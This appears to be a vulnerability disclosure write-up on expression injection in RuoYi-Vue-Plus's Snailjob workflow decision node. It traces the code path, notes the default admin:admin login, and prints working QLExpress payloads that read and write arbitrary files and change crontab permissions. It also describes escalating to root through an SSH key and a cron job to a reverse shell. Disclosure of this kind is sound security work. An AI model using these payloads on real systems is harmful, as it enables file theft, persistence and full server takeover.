# The Ruoyi-vue-plus snailjob component management backend contains arbitrary file writes/reads.
## Address
[https://github.com/alibaba/QLExpress](https://gitee.com/dromara/RuoYi-Vue-Plus)
## Code audit:

RuoYi-Vue-Plus (https://gitee.com/dromara/RuoYi-Vue-Plus) is a rewrite of RuoYi-Vue specifically for Distributed clusters and multi-tenancy The scene has been fully upgraded (incompatible with the original framework).
In the Snailjob component management backend (default password admin:admin ), you can find that QLExpress expressions can be executed in the Workflow - Process Management - Add - Add Decision Node function .
QLExpress is a powerful, lightweight, and dynamic Java platform language developed by the Alibaba team, designed to improve developer productivity in various business scenarios.

<img width="1918" height="870" alt="image" src="https://github.com/user-attachments/assets/3c42ec95-402d-402d-8bbf-ee8daa8ccff9" />

<img width="1873" height="832" alt="image" src="https://github.com/user-attachments/assets/07533961-f3b5-4027-82cc-0e7a2d0da0f6" />

The relevant API can be found at com.aizuda.snailjob.server.web.controller.WorkflowController

<img width="1865" height="962" alt="image" src="https://github.com/user-attachments/assets/cd2d9333-e1de-40cc-aa60-1fdd46f3ca69" />

Following the `checkNodeExpression` method to the implementation layer, we can see that the main execution function is `eval`, which takes `decisionVO.getNodeExpression()` as input , containing our expression. Let's follow this method.

<img width="1275" height="947" alt="image" src="https://github.com/user-attachments/assets/53cc0951-69ac-49e7-8efb-23d6d8b7db1f" />

`doEval` function is called , passing in an expression parameter. Let's follow up on this function.

<img width="1231" height="828" alt="image" src="https://github.com/user-attachments/assets/592a77f5-6681-4138-9443-ef040b02b684" />

Upon entering the QLExpressEngine class, we can see that the expression is ultimately executed in the execute method .

<img width="1253" height="756" alt="image" src="https://github.com/user-attachments/assets/bfb9033c-dfd4-4ddd-8cf9-bf63675af791" />

However, QLExpress has a blacklist filter that blocks commonly used execution command classes, reflection classes, JNDI , script engines, sockets, and other dangerous classes.

<img width="1830" height="961" alt="image" src="https://github.com/user-attachments/assets/5f744841-0621-45b6-8e13-8d1ce9da6de2" />

However, the blacklist does not prohibit the creation of new File objects. When we use the following payload, we can read any file. Local test.
```
is = new java.io.FileInputStream (\"C:/Windows/win.ini\");buffer = new byte[ is.available ()]; is.read (buffer);content = n ew String(buffer); is.close (); content;
```

<img width="1836" height="965" alt="image" src="https://github.com/user-attachments/assets/1d397c33-8674-4761-bc59-0134e4afd4fc" />

Arbitrary file writing
```
os = new java.io.FileOutputStream(\"D:/test.txt\"); content = \"test123\"; os.write(content.getBytes());os.close ();
```
Java does not have system permissions in a Windows environment, so it cannot write to the system directory, but it can write to DLLs and hijack other software DLLs .

<img width="1822" height="962" alt="image" src="https://github.com/user-attachments/assets/d39bdf36-d51d-459e-9e32-f246d6b4e874" />

<img width="1007" height="777" alt="image" src="https://github.com/user-attachments/assets/bf9770b7-946e-4f22-bb13-23b2bea4107a" />

## Vulnerability Reproduction:

Reproduction environment:
JDK : 17
OS : ubuntu
After the front-end and back-end are started, access http://ip:8800/snail-job to enter the back-end. Then, capture network packets at the vulnerable function point.

### Arbitrary file reading

<img width="1872" height="833" alt="image" src="https://github.com/user-attachments/assets/b68be12f-7e4c-4121-9020-7b3632bececd" />

Write to any file, including an SSH public key (Java 's default permissions in Linux are root).

<img width="1872" height="851" alt="image" src="https://github.com/user-attachments/assets/d73faef4-1f48-433e-92d8-61759be1b725" />

<img width="1912" height="712" alt="image" src="https://github.com/user-attachments/assets/9d47a6af-2a39-4deb-a43d-2a3c6af3f39f" />

### SSH passwordless login

<img width="1175" height="827" alt="image" src="https://github.com/user-attachments/assets/7bcc2bb4-7e65-4504-8f22-9b3a9e74b4f1" />

### crontab

To write to a crontab, you also need to set the 0600 permissions for the task scheduler in Ubuntu.
First, write the task to the schedule, then change the file permissions. Note that you must include `\n` when writing the scheduled task; otherwise, it will fail.

<img width="1870" height="850" alt="image" src="https://github.com/user-attachments/assets/c2b87033-9d5b-429f-8fba-fa2b7f8d485d" />

File permission modification payload:

```
file = new java.io.File (\"/var/spool/ cron /crontabs/root\"); readableSet = file.setReadable (false, false); readableOwner = file.setReadable (true, true); writableSet = file.setWritable (false, false); writableOwner = file.setWritable (true, true); executableSet = file.setExecutable (false, false); executableOwner = file.setExecutable (false, true );
```

<img width="1877" height="823" alt="image" src="https://github.com/user-attachments/assets/d8291192-e408-4587-b2c3-92bc215eb656" />


<img width="749" height="492" alt="image" src="https://github.com/user-attachments/assets/4f9157ca-baab-4102-a72b-30daf4bbf1fe" />

Rebound shell successfully

<img width="1233" height="737" alt="image" src="https://github.com/user-attachments/assets/64188e7f-7662-4224-a05b-9f1f79e9faed" />
